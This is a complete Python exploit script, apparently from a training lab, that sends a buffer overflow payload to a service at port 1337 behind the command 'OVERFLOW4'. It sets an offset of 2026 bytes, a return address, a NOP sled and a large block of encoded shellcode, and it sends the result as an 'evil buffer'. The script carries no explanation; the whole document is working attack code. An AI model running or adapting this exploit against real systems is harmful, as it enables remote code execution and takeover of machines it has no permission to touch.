#!/usr/bin/python3
import socket

ip="10.10.239.139"
port=1337

prefix="OVERFLOW4 "
offset=2026
overflow="A" * offset
retn="\xf7\x11\x50\x62"
padding = "\x90" * 32
payload= ("\xba\xd9\xee\x14\x1c\xd9\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\x19\xea\xf6\xe9\x65\x1b\x74"
"\x11\x95\xdc\x19\x9b\x70\xed\x19\xff\xf1\x5e\xaa\x8b\x57\x53"
"\x41\xd9\x43\xe0\x27\xf6\x64\x41\x8d\x20\x4b\x52\xbe\x11\xca"
"\xd0\xbd\x45\x2c\xe8\x0d\x98\x2d\x2d\x73\x51\x7f\xe6\xff\xc4"
"\x6f\x83\x4a\xd5\x04\xdf\x5b\x5d\xf9\xa8\x5a\x4c\xac\xa3\x04"
"\x4e\x4f\x67\x3d\xc7\x57\x64\x78\x91\xec\x5e\xf6\x20\x24\xaf"
"\xf7\x8f\x09\x1f\x0a\xd1\x4e\x98\xf5\xa4\xa6\xda\x88\xbe\x7d"
"\xa0\x56\x4a\x65\x02\x1c\xec\x41\xb2\xf1\x6b\x02\xb8\xbe\xf8"
"\x4c\xdd\x41\x2c\xe7\xd9\xca\xd3\x27\x68\x88\xf7\xe3\x30\x4a"
"\x99\xb2\x9c\x3d\xa6\xa4\x7e\xe1\x02\xaf\x93\xf6\x3e\xf2\xfb"
"\x3b\x73\x0c\xfc\x53\x04\x7f\xce\xfc\xbe\x17\x62\x74\x19\xe0"
"\x85\xaf\xdd\x7e\x78\x50\x1e\x57\xbf\x04\x4e\xcf\x16\x25\x05"
"\x0f\x96\xf0\x8a\x5f\x38\xab\x6a\x0f\xf8\x1b\x03\x45\xf7\x44"
"\x33\x66\xdd\xec\xde\x9d\xb6\x18\x0d\xd3\x97\x75\x33\xeb\x27"
"\xbf\xba\x0d\x2d\xaf\xea\x86\xda\x56\xb7\x5c\x7a\x96\x6d\x19"
"\xbc\x1c\x82\xde\x73\xd5\xef\xcc\xe4\x15\xba\xae\xa3\x2a\x10"
"\xc6\x28\xb8\xff\x16\x26\xa1\x57\x41\x6f\x17\xae\x07\x9d\x0e"
"\x18\x35\x5c\xd6\x63\xfd\xbb\x2b\x6d\xfc\x4e\x17\x49\xee\x96"
"\x98\xd5\x5a\x47\xcf\x83\x34\x21\xb9\x65\xee\xfb\x16\x2c\x66"
"\x7d\x55\xef\xf0\x82\xb0\x99\x1c\x32\x6d\xdc\x23\xfb\xf9\xe8"
"\x5c\xe1\x99\x17\xb7\xa1\xba\xf5\x1d\xdc\x52\xa0\xf4\x5d\x3f"
"\x53\x23\xa1\x46\xd0\xc1\x5a\xbd\xc8\xa0\x5f\xf9\x4e\x59\x12"
"\x92\x3a\x5d\x81\x93\x6e")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")


